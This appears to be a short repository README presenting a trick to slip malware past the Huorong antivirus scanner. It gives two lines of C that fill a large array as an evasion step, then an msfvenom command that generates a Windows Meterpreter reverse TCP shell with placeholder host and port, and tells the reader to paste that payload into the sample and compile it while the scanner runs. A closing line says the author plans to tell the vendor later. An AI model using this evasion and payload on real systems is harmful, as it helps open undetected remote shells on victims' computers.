# bhrong
battle with huorong

I found how to use 2 lines of c/c++ to escape huorong's serch

int c[8192][8192];

for(int i=0;i<8192;i++) for(int j=0;j<8192;j++) c[j][i]=1;


/* your payload here */


use msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP you want] lport=[port you want] -f c -o shell.c

copy the container of shell.c to instead the [exc] in sample ,and then just to try complie it when HuoRong is open.

闲的没事突发奇想搞出来的罢了,开学以后还是告诉官方罢
25/2/1

